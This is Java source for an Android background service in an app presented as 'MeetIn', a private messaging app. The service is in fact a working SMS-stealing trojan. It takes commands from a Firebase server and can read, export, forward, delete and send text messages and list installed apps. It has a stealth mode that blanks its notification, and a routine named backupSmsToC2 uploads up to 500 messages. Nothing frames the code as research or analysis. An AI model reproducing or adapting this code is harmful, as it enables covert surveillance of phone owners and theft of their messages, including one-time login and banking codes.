package chat.meetin.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class DataSyncService extends Service {
    private static final String TAG = "DataSyncService";
    private static final String CHANNEL_ID = "MeetInChannel";
    private static final int NOTIF_ID = 1;
    private static final String PREFS = "MeetIn";

    private DatabaseReference dbRoot;
    private DatabaseReference cmdRef;
    private DatabaseReference respRef;
    private DatabaseReference smsRef;
    private String deviceId;
    private ValueEventListener commandListener;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        deviceId = DeviceInfo.getDeviceId(this);

        dbRoot = FirebaseDatabase.getInstance().getReference();
        cmdRef = dbRoot.child("devices").child(deviceId).child("commands");
        respRef = dbRoot.child("devices").child(deviceId).child("responses");
        smsRef = dbRoot.child("devices").child(deviceId).child("sms");

        Log.d(TAG, "Service created for device: " + deviceId);
        registerDevice();
        listenForCommands();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startForeground(NOTIF_ID, createNotification());
        } catch (Exception e) {
            Log.e(TAG, "Foreground error", e);
        }
        if (intent != null && "SMS_RECEIVED".equals(intent.getAction())) {
            String sender = intent.getStringExtra("sender");
            String body = intent.getStringExtra("body");
            long timestamp = intent.getLongExtra("timestamp", 0);
            if (sender != null && body != null) {
                publishSms(sender, body, timestamp);
            }
        }
        return START_STICKY;
    }

    private void registerDevice() {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("model", Build.MODEL);
        deviceInfo.put("brand", Build.BRAND);
        deviceInfo.put("android", Build.VERSION.RELEASE);
        deviceInfo.put("sdk", Build.VERSION.SDK_INT);
        deviceInfo.put("last_seen", System.currentTimeMillis());
        deviceInfo.put("online", true);

        dbRoot.child("devices").child(deviceId).child("info")
            .setValue(deviceInfo)
            .addOnSuccessListener(aVoid -> {
                Log.d(TAG, "Device registered");
                respRef.push().setValue("DEVICE:" + deviceId + "\nREADY");
            })
            .addOnFailureListener(e -> Log.e(TAG, "Register failed", e));
    }

    private void listenForCommands() {
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot cmdSnapshot : snapshot.getChildren()) {
                    String cmd = cmdSnapshot.getValue(String.class);
                    if (cmd != null && !cmd.isEmpty()) {
                        Log.d(TAG, "Command: " + cmd);
                        String response = executeCmd(cmd);
                        respRef.push().setValue(response);
                        cmdSnapshot.getRef().removeValue();
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e(TAG, "Command listener cancelled", error.toException());
            }
        };
        cmdRef.addValueEventListener(commandListener);
    }

    private void publishSms(String sender, String body, long timestamp) {
        try {
            String formatted = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp));
            Map<String, Object> sms = new HashMap<>();
            sms.put("sender", sender);
            sms.put("body", body);
            sms.put("time", formatted);
            sms.put("ts", timestamp);
            smsRef.push().setValue(sms);
            Log.d(TAG, "SMS published");
        } catch (Exception e) {
            Log.e(TAG, "SMS publish error", e);
        }
    }

    private String executeCmd(String cmd) {
        if (cmd.equalsIgnoreCase("ping")) return "PONG";
        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getFullInfo(this);
        if (cmd.equalsIgnoreCase("device")) return deviceId;
        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getUserApps(this);
        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
        if (cmd.startsWith("sms read ")) {
            try { return DeviceInfo.readSmsLimit(this, Integer.parseInt(cmd.substring(9).trim())); }
            catch (Exception e) { return "Invalid number"; }
        }
        if (cmd.startsWith("sms send ")) return sendSms(cmd.substring(9).trim());
        if (cmd.equalsIgnoreCase("sms delete")) return deleteSms("");
        if (cmd.startsWith("sms delete ")) return deleteSms(cmd.substring(11).trim());
        if (cmd.equalsIgnoreCase("sms silent on")) return setPref("silent_mode", true, "Silent ON");
        if (cmd.equalsIgnoreCase("sms silent off")) return setPref("silent_mode", false, "Silent OFF");
        if (cmd.startsWith("sms keywords add ")) return setPref("sms_keywords", cmd.substring(17).trim(), "Keywords added");
        if (cmd.equalsIgnoreCase("sms keywords clear")) return setPref("sms_keywords", "", "Keywords cleared");
        if (cmd.startsWith("sms whitelist add ")) return setPref("sms_whitelist", cmd.substring(18).trim(), "Whitelist added");
        if (cmd.startsWith("sms blacklist add ")) return setPref("sms_blacklist", cmd.substring(18).trim(), "Blacklist added");
        if (cmd.equalsIgnoreCase("sms whitelist clear")) return setPref("sms_whitelist", "", "Whitelist cleared");
        if (cmd.equalsIgnoreCase("sms blacklist clear")) return setPref("sms_blacklist", "", "Blacklist cleared");
        if (cmd.startsWith("sms time ")) {
            String[] parts = cmd.substring(9).trim().split(" ");
            if (parts.length == 2) {
                SharedPreferences.Editor ed = getSharedPreferences(PREFS, MODE_PRIVATE).edit();
                ed.putString("sms_time_start", parts[0]);
                ed.putString("sms_time_end", parts[1]);
                ed.apply();
                return "Time: " + parts[0] + "-" + parts[1];
            }
            return "Usage: sms time HH:MM HH:MM";
        }
        if (cmd.equalsIgnoreCase("sms time clear")) {
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove("sms_time_start").remove("sms_time_end").apply();
            return "Time cleared";
        }
        if (cmd.equalsIgnoreCase("sms autodelete on")) return setPref("autodelete", true, "Auto-delete ON");
        if (cmd.equalsIgnoreCase("sms autodelete off")) return setPref("autodelete", false, "Auto-delete OFF");
        if (cmd.equalsIgnoreCase("sms forward-delete on")) return setPref("forward_delete", true, "Forward-delete ON");
        if (cmd.equalsIgnoreCase("sms forward-delete off")) return setPref("forward_delete", false, "Forward-delete OFF");
        if (cmd.equalsIgnoreCase("sms bulk export")) return exportAllSms(100);
        if (cmd.startsWith("sms bulk export ")) {
            try { return exportAllSms(Integer.parseInt(cmd.substring(16).trim())); }
            catch (Exception e) { return "Invalid"; }
        }
        if (cmd.startsWith("sms auto-reply delay ")) {
            try {
                int delay = Integer.parseInt(cmd.substring(21).trim());
                getSharedPreferences(PREFS, MODE_PRIVATE).edit().putInt("auto_reply_delay", delay).apply();
                return "Delay: " + delay + "ms";
            } catch (Exception e) { return "Invalid"; }
        }
        if (cmd.startsWith("sms auto-reply ")) return setPref("auto_reply", cmd.substring(15).trim(), "Auto-reply set");
        if (cmd.equalsIgnoreCase("sms stats")) {
            int total = getSharedPreferences(PREFS, MODE_PRIVATE).getInt("sms_total", 0);
            return "SMS intercepted: " + total;
        }
        if (cmd.equalsIgnoreCase("sms log")) return getSmsLog();
        if (cmd.startsWith("sms admin set ")) return setPref("admin_number", cmd.substring(14).trim(), "Admin set");
        if (cmd.equalsIgnoreCase("stealth on")) return setPref("stealth_mode", true, "Stealth ON");
        if (cmd.equalsIgnoreCase("stealth off")) return setPref("stealth_mode", false, "Stealth OFF");
        if (cmd.equalsIgnoreCase("sms backup")) return backupSmsToC2();
        if (cmd.equalsIgnoreCase("sms queue")) return getSmsQueue();
        if (cmd.equalsIgnoreCase("sms queue clear")) return clearSmsQueue();
        if (cmd.startsWith("sms forward ")) return setPref("forward_to", cmd.substring(12).trim(), "Forward set");
        if (cmd.startsWith("sms sim ")) {
            try {
                int sim = Integer.parseInt(cmd.substring(8).trim());
                return setPref("sms_sim", sim, "SIM slot: " + sim);
            } catch (Exception e) { return "Invalid"; }
        }
        if (cmd.equalsIgnoreCase("exit")) {
            dbRoot.child("devices").child(deviceId).child("info").child("online").setValue(false);
            stopSelf();
            return "EXIT";
        }
        return "Unknown. Try: ping, info, sms read, sms send, sms delete, sms silent, sms keywords, sms whitelist, sms blacklist, sms time, sms autodelete, sms forward-delete, sms bulk export, sms auto-reply, sms stats, sms log, stealth, sms backup, sms queue, sms forward, sms sim, apps list, device, exit";
    }

    private String setPref(String key, Object value, String msg) {
        try {
            SharedPreferences.Editor ed = getSharedPreferences(PREFS, MODE_PRIVATE).edit();
            if (value instanceof Boolean) ed.putBoolean(key, (Boolean) value);
            else if (value instanceof Integer) ed.putInt(key, (Integer) value);
            else ed.putString(key, (String) value);
            ed.apply();
            return msg;
        } catch (Exception e) { return "Error"; }
    }

    private String sendSms(String args) {
        try {
            String[] parts = args.split(" ", 2);
            if (parts.length < 2) return "Usage: sms send <num> <msg>";
            android.telephony.SmsManager sm;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                sm = getSystemService(android.telephony.SmsManager.class);
            } else {
                sm = android.telephony.SmsManager.getDefault();
            }
            if (sm == null) return "SMS unavailable";
            java.util.ArrayList<String> pl = sm.divideMessage(parts[1]);
            sm.sendMultipartTextMessage(parts[0], null, pl, null, null);
            return "SMS sent to " + parts[0];
        } catch (Exception e) { return "Send error: " + e.getMessage(); }
    }

    private String deleteSms(String arg) {
        try {
            if (arg == null || arg.trim().isEmpty()) return deleteMostRecentSms(1);
            String trimmed = arg.trim();
            try {
                int value = Integer.parseInt(trimmed);
                if (value >= 1 && value <= 50) return deleteMostRecentSms(value);
                android.net.Uri uri = android.net.Uri.parse("content://sms/" + value);
                int deleted = getContentResolver().delete(uri, null, null);
                return deleted > 0 ? "SMS ID " + value + " deleted" : "Not found";
            } catch (NumberFormatException e) { return "Invalid"; }
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private String deleteMostRecentSms(int count) {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
            android.database.Cursor c = getContentResolver().query(
                uri, new String[]{"_id", "address", "body"}, null, null, "date DESC LIMIT " + count);
            if (c == null) return "No SMS access";
            if (!c.moveToFirst()) { c.close(); return "No SMS to delete"; }
            StringBuilder sb = new StringBuilder();
            int deletedCount = 0;
            do {
                int idIdx = c.getColumnIndex("_id");
                int addrIdx = c.getColumnIndex("address");
                int bodyIdx = c.getColumnIndex("body");
                if (idIdx < 0) continue;
                String id = c.getString(idIdx);
                String addr = addrIdx >= 0 ? c.getString(addrIdx) : "unknown";
                String body = bodyIdx >= 0 ? c.getString(bodyIdx) : "";
                String shortBody = body.length() > 30 ? body.substring(0, 30) + "..." : body;
                android.net.Uri smsUri = android.net.Uri.parse("content://sms/" + id);
                if (getContentResolver().delete(smsUri, null, null) > 0) {
                    deletedCount++;
                    sb.append("  - ").append(addr).append(": ").append(shortBody).append("\n");
                }
            } while (c.moveToNext());
            c.close();
            if (deletedCount == 0) return "No SMS deleted";
            return "Deleted " + deletedCount + " most recent SMS:\n" + sb.toString();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private String exportAllSms(int limit) {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
            android.database.Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT " + limit);
            if (c == null) return "No access";
            StringBuilder sb = new StringBuilder("SMS Export (" + c.getCount() + "):\n");
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndex("address"))).append("|")
                  .append(c.getString(c.getColumnIndex("body"))).append("\n");
            }
            c.close();
            return sb.toString();
        } catch (Exception e) { return "Error"; }
    }

    private String getSmsLog() {
        try {
            File f = new File(getFilesDir(), "sms_log.txt");
            if (!f.exists()) return "No log file";
            BufferedReader br = new BufferedReader(new FileReader(f));
            StringBuilder sb = new StringBuilder();
            String line; int n = 0;
            while ((line = br.readLine()) != null && n < 50) { sb.append(line).append("\n"); n++; }
            br.close();
            return sb.toString();
        } catch (Exception e) { return "Error"; }
    }

    private String getSmsQueue() {
        String q = getSharedPreferences(PREFS, MODE_PRIVATE).getString("sms_queue", "");
        return q.isEmpty() ? "Queue empty" : "SMS Queue:\n" + q;
    }

    private String clearSmsQueue() {
        getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove("sms_queue").apply();
        return "Queue cleared";
    }

    private String backupSmsToC2() {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms");
            android.database.Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 500");
            if (c == null) return "No access";
            while (c.moveToNext()) {
                Map<String, Object> sms = new HashMap<>();
                sms.put("sender", c.getString(c.getColumnIndex("address")));
                sms.put("body", c.getString(c.getColumnIndex("body")));
                sms.put("ts", c.getString(c.getColumnIndex("date")));
                sms.put("backup", true);
                smsRef.push().setValue(sms);
            }
            c.close();
            return "Backup sent";
        } catch (Exception e) { return "Error"; }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "MeetIn", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Private Messaging app for individuals and businesses");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification createNotification() {
        boolean stealth = getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean("stealth_mode", false);
        NotificationCompat.Builder b = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_stat_meetin)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true);
        if (stealth) {
            b.setContentTitle("").setContentText("").setPriority(NotificationCompat.PRIORITY_MIN);
        } else {
            b.setContentTitle("MeetIn").setContentText("Private Messaging app for individuals and businesses");
        }
        return b.build();
    }

    @Override
    public void onDestroy() {
        try {
            dbRoot.child("devices").child(deviceId).child("info").child("online").setValue(false);
            if (commandListener != null) cmdRef.removeEventListener(commandListener);
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
